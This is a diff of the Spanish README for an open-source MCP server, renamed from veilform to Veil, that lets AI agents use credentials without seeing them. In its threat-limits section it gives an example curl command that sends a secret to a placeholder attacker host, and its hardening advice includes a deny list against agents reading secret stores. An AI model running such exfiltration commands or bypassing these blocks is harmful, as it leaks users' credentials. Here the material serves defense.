@@ -4,25 +4,25 @@
 
 <img src="docs/assets/hero-es.svg" width="100%" alt="Animación: el agente pide un token solo con metadatos, se abre un formulario local, escribes el secreto (se ven puntos), el valor va directo a .env, SSH, SQL o una API, y el agente solo recibe {stored:[&quot;MP_ACCESS_TOKEN&quot;]}.">
 
-# veilform
+# Veil
 
 **Que un agente de IA pida, guarde y use credenciales sin verlas jamás.**
 
-[![CI](https://github.com/asteby/veilform/actions/workflows/ci.yml/badge.svg)](https://github.com/asteby/veilform/actions/workflows/ci.yml) [![Licencia: MIT](https://img.shields.io/badge/licencia-MIT-blue.svg)](LICENSE) [![Node ≥ 20.11](https://img.shields.io/badge/node-%E2%89%A5%2020.11-339933?logo=node.js&logoColor=white)](package.json) [![Servidor MCP](https://img.shields.io/badge/MCP-servidor%20stdio-6f42c1)](https://modelcontextprotocol.io)
+[![CI](https://github.com/asteby/veil/actions/workflows/ci.yml/badge.svg)](https://github.com/asteby/veil/actions/workflows/ci.yml) [![Licencia: MIT](https://img.shields.io/badge/licencia-MIT-blue.svg)](LICENSE) [![Node ≥ 20.11](https://img.shields.io/badge/node-%E2%89%A5%2020.11-339933?logo=node.js&logoColor=white)](package.json) [![Servidor MCP](https://img.shields.io/badge/MCP-servidor%20stdio-6f42c1)](https://modelcontextprotocol.io)
 
 [Modelo de amenazas](THREAT-MODEL.md) · [Política de seguridad](SECURITY.md) · [Cambios](CHANGELOG.md)
 
 </div>
 
-`veilform` es un servidor [MCP](https://modelcontextprotocol.io) de código abierto (stdio, TypeScript). El agente manda **solo metadatos** (el esquema de un formulario); tú escribes los valores en una página servida en `http://127.0.0.1`; van directo al destino que autorizaste. El agente recibe nombres y estados, nunca valores.
+**Veil** (`@asteby/veil`) es un servidor [MCP](https://modelcontextprotocol.io) de código abierto (stdio, TypeScript). El agente manda **solo metadatos** (el esquema de un formulario); tú escribes los valores en una página servida en `http://127.0.0.1`; van directo al destino que autorizaste. El agente recibe nombres y estados, nunca valores.
 
 ## Por qué
 
-- **Un secreto pegado en el chat se queda en el chat.** Una vez en la conversación forma parte del contexto del modelo y de lo que guarde el cliente. veilform deja el valor en una página local, fuera de la conversación.
+- **Un secreto pegado en el chat se queda en el chat.** Una vez en la conversación forma parte del contexto del modelo y de lo que guarde el cliente. Veil deja el valor en una página local, fuera de la conversación.
 - **El agente necesita *usar* credenciales, no leerlas.** Escribe `${secret:NOMBRE}`; el servidor lo resuelve dentro de su propio proceso en el momento de usarlo, después de que apruebas la acción literal, y limpia la salida.
 - **El trabajo real es más que una API key.** Listas de precios pegadas desde una hoja de cálculo, datos de clientes, llaves SSH para un servidor nuevo, un token que debe terminar en el `.env` de producción, un respaldo cifrado de todo, una llave que le pasas al agente de un compañero: todo con el mismo flujo y con auditoría.
 
-**Sin veilform**
+**Sin Veil**
 
 ```text
 Tú:     aquí está el token: APP_USR-4821-…-9f3c
@@ -33,7 +33,7 @@ Agente: ¡Gracias! Lo escribo en /etc/acme.env:
   y en el historial de la conversación.
 ```
 
-**Con veilform**
+**Con Veil**
 
 ```text
 Agente: secret_request({fields:[{name:"MP_ACCESS_TOKEN"}]})
@@ -54,7 +54,7 @@ Agente: ← {written:true, keys:[{key:"MP_ACCESS_TOKEN", action:"updated"}]}
 3. Llenas o apruebas. Token CSRF + verificación de Origin/Host + CSP estricta con nonce; nada de terceros; sin autocompletado.
 4. Los valores van al destino desde este proceso (stdin/env, nunca argv; nunca en logs).
 5. Las respuestas son estructurales; un filtro final elimina cualquier valor manejado y sus codificaciones.
-6. Cada uso queda auditado (JSONL encadenado por hash). `veilform verify-audit` verifica la cadena.
+6. Cada uso queda auditado (JSONL encadenado por hash). `veil verify-audit` verifica la cadena.
 
 ## Capacidades
 
@@ -101,69 +101,71 @@ Capturas reales de las páginas locales, regeneradas con Playwright desde la UI 
 Requisitos: Node ≥ 20.11 — nada más en ejecución (pnpm para compilar desde el código). Aún no está publicado en npm, así que se instala desde un clon:
 
 ```bash
-git clone https://github.com/asteby/veilform && cd veilform
+git clone https://github.com/asteby/veil && cd veil
 pnpm install && pnpm build
-claude mcp add veilform -- node "$PWD/dist/cli.js"
+claude mcp add veil -- node "$PWD/dist/cli.js"
 ```
 
-Luego pídele al agente algo que requiera una credencial (“configura el token del proveedor de pagos en producción”) y abrirá la página local. Cuando esté publicado: `claude mcp add veilform -- npx -y veilform`.
+Luego pídele al agente algo que requiera una credencial (“configura el token del proveedor de pagos en producción”) y abrirá la página local. Cuando esté publicado: `claude mcp add veil -- npx -y @asteby/veil`.
 
-Se usa el llavero del sistema cuando funciona (Linux: `secret-tool` del paquete `libsecret-tools` + GNOME Keyring/KWallet; macOS: `security`); si no funciona, veilform usa su propio almacén cifrado y no hace falta instalar nada. Opcionales, solo para las funciones que los usan: `playwright-core` + Chromium (`web_capture`), `psql` (sinks SQL), `gh` (secretos de GitHub), OpenSSH, `git` (destinos de sincronización git). `veilform doctor` dice exactamente qué falta y el comando para instalarlo.
+> **Antes se llamaba `veilform`.** No hay que migrar nada a mano: el comando `veilform` queda como alias, las variables `VEILFORM_*` siguen funcionando (con aviso de obsolescencia; usa `VEIL_*`), se usa `~/.config/veilform` mientras no exista `~/.config/veil` (`veil doctor` muestra el `mv`), los secretos del servicio de llavero `veilform` y los archivos escritos antes (almacén cifrado, bundles, tokens de compartir, `.env` cifrados con `#/veilform-env v1` / `enc:v1:`) se siguen abriendo. Registra el servidor MCP con el nombre nuevo: `claude mcp remove veilform && claude mcp add veil -- node "$PWD/dist/cli.js"`. Detalle en el [CHANGELOG](CHANGELOG.md) (en inglés).
+
+Se usa el llavero del sistema cuando funciona (Linux: `secret-tool` del paquete `libsecret-tools` + GNOME Keyring/KWallet; macOS: `security`); si no funciona, Veil usa su propio almacén cifrado y no hace falta instalar nada. Opcionales, solo para las funciones que los usan: `playwright-core` + Chromium (`web_capture`), `psql` (sinks SQL), `gh` (secretos de GitHub), OpenSSH, `git` (destinos de sincronización git). `veil doctor` dice exactamente qué falta y el comando para instalarlo.
 
 ## Primer uso
 
 ```bash
-node dist/cli.js init      # cuando esté publicado: npx veilform init
+node dist/cli.js init      # cuando esté publicado: npx @asteby/veil init
 ```
 
-`init` ejecuta el diagnóstico, muestra un plan y, cuando confirmas (`--yes` para no preguntar, `--dry-run` para solo verlo), aplica **solo cambios de tu usuario**: crea `~/.config/veilform` (0700), corrige permisos y escribe un `config.json` cuyo destino por defecto **funciona sin instalar nada**:
+`init` ejecuta el diagnóstico, muestra un plan y, cuando confirmas (`--yes` para no preguntar, `--dry-run` para solo verlo), aplica **solo cambios de tu usuario**: crea `~/.config/veil` (0700), corrige permisos y escribe un `config.json` cuyo destino por defecto **funciona sin instalar nada**:
 
-- Llavero del sistema utilizable → `local` = llavero con `fallback: "auto"` (si el llavero falla después, los valores van al almacén cifrado de veilform).
-- Llavero ausente, bloqueado o no soportado → `local` = almacén cifrado de veilform (`encrypted-file` con `key: {source: "master"}`, archivo `~/.config/veilform/local-vault.json`).
+- Llavero del sistema utilizable → `local` = llavero con `fallback: "auto"` (si el llavero falla después, los valores van al almacén cifrado de Veil).
+- Llavero ausente, bloqueado o no soportado → `local` = almacén cifrado de Veil (`encrypted-file` con `key: {source: "master"}`, archivo `~/.config/veil/local-vault.json`).
 
-Nunca ejecuta `sudo` ni pide secretos. Los comandos que necesitan privilegios (p. ej. `sudo apt install -y libsecret-tools`) se imprimen para que los copies. El `postinstall` opcional solo muestra una pista; con `VEILFORM_POSTINSTALL=init` ejecuta `init --dry-run` al instalar.
+Nunca ejecuta `sudo` ni pide secretos. Los comandos que necesitan privilegios (p. ej. `sudo apt install -y libsecret-tools`) se imprimen para que los copies. El `postinstall` opcional solo muestra una pista; con `VEIL_POSTINSTALL=init` ejecuta `init --dry-run` al instalar.
 
 **El almacén cifrado** es un solo archivo en el formato `encrypted-file` existente: AES-256-GCM por valor (el nombre va como AAD), llave derivada con argon2id (Node ≥ 24.7; si no, scrypt N=2^17) de una **contraseña maestra**:
 
-1. La primera vez que un valor tiene que ir ahí, la página local (127.0.0.1) te pide **definir la contraseña maestra ahí mismo** — nunca en el chat, en argumentos MCP ni en argv. También puedes hacerlo antes: `veilform unlock`, `veilform init --master` o la herramienta MCP `local_unlock`.
-2. Al desbloquear solo se guarda en memoria la **llave derivada**: en el agente de sesión (`veilform agent`) si está activo — entonces todos los procesos de veilform la comparten y `veilform lock` la olvida — o dentro del proceso MCP durante `localVault.unlockMinutes` (15 por defecto).
-3. Más adelante, cuando el llavero funcione, puedes guardar ahí la llave derivada para abrir el almacén sin escribir la contraseña: `veilform unlock --save-keychain` (`--forget-keychain` lo deshace). `veilform unlock --change-password` vuelve a cifrar todo con otra contraseña.
+1. La primera vez que un valor tiene que ir ahí, la página local (127.0.0.1) te pide **definir la contraseña maestra ahí mismo** — nunca en el chat, en argumentos MCP ni en argv. También puedes hacerlo antes: `veil unlock`, `veil init --master` o la herramienta MCP `local_unlock`.
+2. Al desbloquear solo se guarda en memoria la **llave derivada**: en el agente de sesión (`veil agent`) si está activo — entonces todos los procesos de Veil la comparten y `veil lock` la olvida — o dentro del proceso MCP durante `localVault.unlockMinutes` (15 por defecto).
+3. Más adelante, cuando el llavero funcione, puedes guardar ahí la llave derivada para abrir el almacén sin escribir la contraseña: `veil unlock --save-keychain` (`--forget-keychain` lo deshace). `veil unlock --change-password` vuelve a cifrar todo con otra contraseña.
 4. Nunca se escribe texto plano en disco; los valores y la contraseña maestra se registran en la lista de borrado antes que nada y nunca llegan a respuestas, logs ni a la auditoría.
 
-> **Si olvidas la contraseña maestra los datos no se pueden recuperar** — es intencional, no hay puerta trasera. Guárdala en tu gestor de contraseñas o en papel y respalda `local-vault.json` (sin la contraseña no sirve de nada). Para una copia cifrada fuera de la máquina usa `veilform export` / `vault_sync`.
+> **Si olvidas la contraseña maestra los datos no se pueden recuperar** — es intencional, no hay puerta trasera. Guárdala en tu gestor de contraseñas o en papel y respalda `local-vault.json` (sin la contraseña no sirve de nada). Para una copia cifrada fuera de la máquina usa `veil export` / `vault_sync`.
 
 Si el destino por defecto es el llavero y falla durante un `secret_request`, la página **ofrece continuar con el almacén cifrado** (pidiendo — o creando — la contraseña maestra en esa misma página) en vez de fallar, y muestra el comando exacto para arreglar el llavero de forma permanente. Pon `fallback: "never"` en un destino `keychain` para prohibirlo.
 
 <details>
 <summary><b>Configuración, variables de entorno y endurecimiento</b></summary>
 
-- La configuración es una **allowlist**: copia [`examples/config.example.json`](examples/config.example.json) a `~/.config/veilform/config.json` (o deja que `init` escriba una mínima) y deja solo lo necesario. Sin archivo hay un único destino, `local` (llavero del SO con `fallback: "ask"`: si el llavero falla, la página ofrece el almacén cifrado). Verifícala con `veilform check-config` y `veilform doctor`.
-- Variables: `VEILFORM_HOME` (por defecto `~/.config/veilform`), `VEILFORM_CONFIG`, `VEILFORM_AGENT` (etiqueta que se escribe en la auditoría), `VEILFORM_KEY_FILE` (archivo de llave para `.env` cifrados), `VEILFORM_POSTINSTALL`.
-- Endurecimiento recomendado en Claude Code (`.claude/settings.json`): niega a las herramientas propias del agente lo que este servidor protege, p. ej. `"deny": ["Read(~/.config/veilform/**)", "Bash(secret-tool:*)", "Bash(security:*)", "Read(**/.env)"]`.
+- La configuración es una **allowlist**: copia [`examples/config.example.json`](examples/config.example.json) a `~/.config/veil/config.json` (o deja que `init` escriba una mínima) y deja solo lo necesario. Sin archivo hay un único destino, `local` (llavero del SO con `fallback: "ask"`: si el llavero falla, la página ofrece el almacén cifrado). Verifícala con `veil check-config` y `veil doctor`.
+- Variables: `VEIL_HOME` (por defecto `~/.config/veil`), `VEIL_CONFIG`, `VEIL_AGENT` (etiqueta que se escribe en la auditoría), `VEIL_KEY_FILE` (archivo de llave para `.env` cifrados), `VEIL_POSTINSTALL`.
+- Endurecimiento recomendado en Claude Code (`.claude/settings.json`): niega a las herramientas propias del agente lo que este servidor protege, p. ej. `"deny": ["Read(~/.config/veil/**)", "Bash(secret-tool:*)", "Bash(security:*)", "Read(**/.env)"]`.
 
 </details>
 
 ## Solución de problemas
 
-Ejecuta `veilform doctor` (o la herramienta MCP de solo lectura `doctor`; `--json` para máquinas). Revisa Node/cripto (argon2id), el backend de llavero (secret-tool, sesión D-Bus, proveedor de Secret Service y si el llavero por defecto está desbloqueado en Linux; `security` en macOS; en Windows el backend de Credential Manager está previsto y se usa el almacén cifrado), el destino por defecto, el almacén cifrado y el agente de sesión, los permisos de `~/.config/veilform`, y ssh/git/gh/psql/Chromium para las funciones que los usan. Cada problema trae su impacto y el comando exacto para tu distribución (apt, dnf, pacman, zypper, apk, brew, winget). No ejecuta nada con privilegios ni pide nada secreto.
+Ejecuta `veil doctor` (o la herramienta MCP de solo lectura `doctor`; `--json` para máquinas). Revisa Node/cripto (argon2id), el backend de llavero (secret-tool, sesión D-Bus, proveedor de Secret Service y si el llavero por defecto está desbloqueado en Linux; `security` en macOS; en Windows el backend de Credential Manager está previsto y se usa el almacén cifrado), el destino por defecto, el almacén cifrado y el agente de sesión, los permisos de `~/.config/veil`, y ssh/git/gh/psql/Chromium para las funciones que los usan. Cada problema trae su impacto y el comando exacto para tu distribución (apt, dnf, pacman, zypper, apk, brew, winget). No ejecuta nada con privilegios ni pide nada secreto.
 
 Los errores son estructurados — `{error, code, help:{en,es}, fix:{en,es,command, alternative}}` — en las respuestas MCP, y traducidos en la página local:
 
 | Código | Qué pasa | Arreglo |
 |---|---|---|
-| `keychain_unavailable` | `secret-tool` no instalado (`reason: missing_tool`), sin sesión D-Bus (`no_dbus`, SSH/sin escritorio) o sin Secret Service (`no_service`) | `sudo apt install -y libsecret-tools` (o dnf/pacman/…), `dbus-run-session -- $SHELL`, `gnome-keyring-daemon --start --components=secrets` — o `veilform init` |
+| `keychain_unavailable` | `secret-tool` no instalado (`reason: missing_tool`), sin sesión D-Bus (`no_dbus`, SSH/sin escritorio) o sin Secret Service (`no_service`) | `sudo apt install -y libsecret-tools` (o dnf/pacman/…), `dbus-run-session -- $SHELL`, `gnome-keyring-daemon --start --components=secrets` — o `veil init` |
 | `keychain_locked` | el llavero está bloqueado o esperando un diálogo de desbloqueo | desbloquea "Inicio de sesión" en Contraseñas y claves (`seahorse`); macOS: `security unlock-keychain` |
-| `keychain_unsupported` | aún no hay backend de llavero en este SO (Windows) | `veilform init` (almacén cifrado) |
-| `passphrase_required` | el almacén cifrado está bloqueado | MCP `local_unlock` o `veilform unlock` |
-| `master_password_not_set` | el almacén cifrado aún no tiene contraseña maestra | defínela en la página local (`veilform unlock`) |
-| `destination_not_configured` | el destino no está en `config.json` | `veilform init` o agrégalo |
+| `keychain_unsupported` | aún no hay backend de llavero en este SO (Windows) | `veil init` (almacén cifrado) |
+| `passphrase_required` | el almacén cifrado está bloqueado | MCP `local_unlock` o `veil unlock` |
+| `master_password_not_set` | el almacén cifrado aún no tiene contraseña maestra | defínela en la página local (`veil unlock`) |
+| `destination_not_configured` | el destino no está en `config.json` | `veil init` o agrégalo |
 | `wrong_key` / `too_many_attempts` | contraseña maestra incorrecta / bloqueo temporal tras 5 fallos | reintenta más tarde |
 
 ## Sincronización, compartir y `.env` cifrados
 
 Todas las respuestas son nombres, conteos e ids; las passphrases y los tokens se escriben o se muestran en la página local.
 
-**Bundle** (`manifest.json` + `o/<id aleatorio>` por secreto, o un solo `.vfb`): una llave de datos (DEK) AES-256-GCM aleatoria por secreto, envuelta por una KEK = HKDF(argon2id/scrypt(passphrase) ‖ archivo de llave / llavero opcional). Nombres y metadatos viven solo en el índice cifrado; la cabecera (versión, id del bundle, `seq` monótono, parámetros de llave, sha256 de cada objeto) es el AAD del índice: bundles con objetos intercambiados, truncados, editados o antiguos (rollback) se rechazan. Cada secreto lleva un reloj vectorial: `vault_sync` nunca sobrescribe en silencio un cambio concurrente (`strategy`: `report`, `keep-local`, `take-remote`, `keep-both`). CLI: `veilform export|import|sync|rekey`.
+**Bundle** (`manifest.json` + `o/<id aleatorio>` por secreto, o un solo `.vfb`): una llave de datos (DEK) AES-256-GCM aleatoria por secreto, envuelta por una KEK = HKDF(argon2id/scrypt(passphrase) ‖ archivo de llave / llavero opcional). Nombres y metadatos viven solo en el índice cifrado; la cabecera (versión, id del bundle, `seq` monótono, parámetros de llave, sha256 de cada objeto) es el AAD del índice: bundles con objetos intercambiados, truncados, editados o antiguos (rollback) se rechazan. Cada secreto lleva un reloj vectorial: `vault_sync` nunca sobrescribe en silencio un cambio concurrente (`strategy`: `report`, `keep-local`, `take-remote`, `keep-both`). CLI: `veil export|import|sync|rekey`.
 
 **Destinos** (`sync.targets` en la config, allowlist): `dir`, `ssh` (host de `ssh.hosts`), `git` (repo privado; `git` por argv, credenciales de tu ssh-agent/credential helper), `s3` (S3/R2/MinIO, SigV4 propio), `webdav`, `http`. Las credenciales de los destinos son referencias al almacén local (`tokenRef`, `accessKeyRef`…), nunca en línea.
 
@@ -171,25 +173,25 @@ Todas las respuestas son nombres, conteos e ids; las passphrases y los tokens se
 "sync": {
   "targets": { "r2": { "type": "s3", "endpoint": "https://<cuenta>.r2.cloudflarestorage.com", "bucket": "vault", "accessKeyRef": "R2_ID", "secretKeyRef": "R2_SECRET" },
                "repo": { "type": "git", "url": "git@github.com:yo/vault-backup.git" } },
-  "secondFactor": { "type": "key-file", "path": "~/.config/veilform/sync.key" },
+  "secondFactor": { "type": "key-file", "path": "~/.config/veil/sync.key" },
   "shareTarget": "r2"
 }
 ```
 
-**Token de compartir** = `vfs1://<destino>/<share_id>#<llave>` — la llave va en el fragmento de la URL (nunca se envía a un servidor). Con `require_passphrase` el bundle se cifra con HKDF(llave ‖ argon2id(passphrase)); la caducidad y el máximo de lecturas van en la cabecera autenticada. Una persona lo abre con `veilform share open` (página local, token en el fragmento o pegado, valores ocultos de nuevo a los N s); otro agente usa `share_import({token_file})` y después `secret_use`.
+**Token de compartir** = `vfs1://<destino>/<share_id>#<llave>` — la llave va en el fragmento de la URL (nunca se envía a un servidor). Con `require_passphrase` el bundle se cifra con HKDF(llave ‖ argon2id(passphrase)); la caducidad y el máximo de lecturas van en la cabecera autenticada. Una persona lo abre con `veil share open` (página local, token en el fragmento o pegado, valores ocultos de nuevo a los N s); otro agente usa `share_import({token_file})` y después `secret_use`.
 
-**`.env` cifrado** (cabecera `#/veilform-env v1`, `CLAVE="enc:v1:…"` por valor, comentarios/orden conservados, MAC de todo el archivo, N destinatarios). `secret_use({env_file})` y `secret_write({from:{kind:"env-enc"}})` los usan sin que el modelo vea valores:
+**`.env` cifrado** (cabecera `#/veil-env v1`, `CLAVE="veil:1:…"` por valor, comentarios/orden conservados, MAC de todo el archivo, N destinatarios). `secret_use({env_file})` y `secret_write({from:{kind:"env-enc"}})` los usan sin que el modelo vea valores:
 
 ```bash
-veilform env keygen ~/.config/veilform/keys/miapp.key        # 0600, fuera del repo
-veilform env encrypt .env.production --key-file ~/.config/veilform/keys/miapp.key   # + passphrase por TTY
-veilform env hook install                                     # el pre-commit rechaza .env en claro
-veilform run --env .env.production -- node server.js           # valores solo en el entorno del hijo; salida redactada
-veilform env unlock .env.production --status                  # qué métodos de desbloqueo sirven aquí (sin valores)
-veilform env share .env.production --expires 1h --max-views 1 # token que desbloquea SOLO este archivo
+veil env keygen ~/.config/veil/keys/miapp.key                 # 0600, fuera del repo
+veil env encrypt .env.production --key-file ~/.config/veil/keys/miapp.key  # + passphrase por TTY
+veil env hook install                                         # el pre-commit rechaza .env en claro
+veil run --env .env.production -- node server.js              # valores solo en el entorno del hijo; salida redactada
+veil env unlock .env.production --status                      # qué métodos de desbloqueo sirven aquí (sin valores)
+veil env share .env.production --expires 1h --max-views 1     # token que desbloquea SOLO este archivo
 ```
 
-Métodos de desbloqueo: archivo de llave (`--key-file`, `VEILFORM_KEY_FILE`, `env.keyFiles`), llavero del SO (`env.keychain`), credencial de systemd (`LoadCredential=veilform-key:…`, ver [`examples/systemd/`](examples/systemd/)), agente de sesión (`veilform agent`, `veilform lock`), passphrase (TTY o página local, intentos limitados), token de compartir. Límites y comparación con age/sops/1Password/Vault: [THREAT-MODEL.md §8](THREAT-MODEL.md#8-sync-sharing-and-encrypted-env-files) (en inglés).
+Métodos de desbloqueo: archivo de llave (`--key-file`, `VEIL_KEY_FILE`, `env.keyFiles`), llavero del SO (`env.keychain`), credencial de systemd (`LoadCredential=veil-key:…`, ver [`examples/systemd/`](examples/systemd/)), agente de sesión (`veil agent`, `veil lock`), passphrase (TTY o página local, intentos limitados), token de compartir. Límites y comparación con age/sops/1Password/Vault: [THREAT-MODEL.md §8](THREAT-MODEL.md#8-sync-sharing-and-encrypted-env-files) (en inglés).
 
 ## Ejemplos
 
@@ -220,7 +222,7 @@ Métodos de desbloqueo: archivo de llave (`--key-file`, `VEILFORM_KEY_FILE`, `en
 **Qué no protege** (lee el [modelo de amenazas](THREAT-MODEL.md))
 
 - Una acción **que tú apruebas** y que envía o transforma el valor (`curl https://atacante/?k=${secret:X}`). La aprobación muestra la acción literal y advierte sobre shells y herramientas de red/codificación, pero tú decides.
-- Malware o un agente con shell sin restricciones corriendo con **tu usuario del sistema**: puede leer el llavero y los archivos que veilform escribe. Restringe las herramientas del agente (ver el endurecimiento arriba) o aíslalo.
+- Malware o un agente con shell sin restricciones corriendo con **tu usuario del sistema**: puede leer el llavero y los archivos que Veil escribe. Restringe las herramientas del agente (ver el endurecimiento arriba) o aíslalo.
 - **Un navegador que el modelo sí ve** (extensión de navegador, Playwright MCP, computer use) abriendo una página que muestra un secreto. Usa `web_capture`, que solo devuelve estado.
 - Un token de compartir o una contraseña maestra que se filtra, o que olvidas (sin recuperación, por diseño); revocar un token no hace olvidar a quien ya lo leyó: rota.
 - La redacción es heurística: valores muy cortos y codificaciones exóticas no se detectan. Las cadenas de JavaScript no se pueden borrar de memoria.
@@ -229,11 +231,11 @@ Métodos de desbloqueo: archivo de llave (`--key-file`, `VEILFORM_KEY_FILE`, `en
 
 Otras buenas herramientas atacan problemas cercanos; muchas veces se complementan en lugar de competir. Las descripciones se basan en la documentación pública de cada proyecto; revísala para el detalle actual.
 
-| Enfoque | Qué resuelve bien | Dónde encaja veilform |
+| Enfoque | Qué resuelve bien | Dónde encaja Veil |
 |---|---|---|
-| **Gestores de contraseñas / 1Password** (`op run`, referencias `op://`, Connect) | Guardar y compartir secretos entre personas y equipos, políticas, rotación. 1Password ha [dicho públicamente](https://1password.com/blog/where-mcp-fits-and-where-it-doesnt) que no expondrá credenciales en crudo por MCP y prefiere inyectarlas a nombre del agente. | veilform puede usar **1Password Connect como destino**: escribes el valor en el formulario local y se guarda ahí de servidor a servidor. |
-| **HashiCorp Vault / Infisical** | Almacén central con políticas de acceso, auditoría, leases y (en Vault) secretos dinámicos. | También son **destinos** (adaptadores `vault-kv2`, `infisical`). veilform agrega el paso humano de captura y la aprobación por acción cuando el agente los usa. |
-| **Configuración cifrada en git** (sops, age, dotenvx) | Versionar secretos cifrados junto al código, con destinatarios del equipo y descifrado en CI. | El `.env` cifrado de veilform sigue la misma idea; la diferencia es que el agente lo edita, compara y ejecuta **sin que los valores entren a su contexto**. Detalle en [THREAT-MODEL.md §8.3](THREAT-MODEL.md#83-comparison). |
+| **Gestores de contraseñas / 1Password** (`op run`, referencias `op://`, Connect) | Guardar y compartir secretos entre personas y equipos, políticas, rotación. 1Password ha [dicho públicamente](https://1password.com/blog/where-mcp-fits-and-where-it-doesnt) que no expondrá credenciales en crudo por MCP y prefiere inyectarlas a nombre del agente. | Veil puede usar **1Password Connect como destino**: escribes el valor en el formulario local y se guarda ahí de servidor a servidor. |
+| **HashiCorp Vault / Infisical** | Almacén central con políticas de acceso, auditoría, leases y (en Vault) secretos dinámicos. | También son **destinos** (adaptadores `vault-kv2`, `infisical`). Veil agrega el paso humano de captura y la aprobación por acción cuando el agente los usa. |
+| **Configuración cifrada en git** (sops, age, dotenvx) | Versionar secretos cifrados junto al código, con destinatarios del equipo y descifrado en CI. | El `.env` cifrado de Veil sigue la misma idea; la diferencia es que el agente lo edita, compara y ejecuta **sin que los valores entren a su contexto**. Detalle en [THREAT-MODEL.md §8.3](THREAT-MODEL.md#83-comparison). |
 | **Proxies de inyección y brokers** para agentes (p. ej. [OneCLI](https://github.com/onecli/onecli), [BlindKey](https://github.com/leocelis/blindkey)) | El agente usa marcadores y un gateway/broker pone la credencial real cuando sale la petición; muy adecuado para llamadas frecuentes a APIs. | Se enfoca en **meter** valores (formularios, tablas, captura web, llaves SSH) y **llevarlos a su lugar** (`.env` por SSH, SQL, secretos de GitHub), cada uno con aprobación literal. Un proxy puede atender las llamadas de alto volumen en paralelo. |
 
 ## Desarrollo
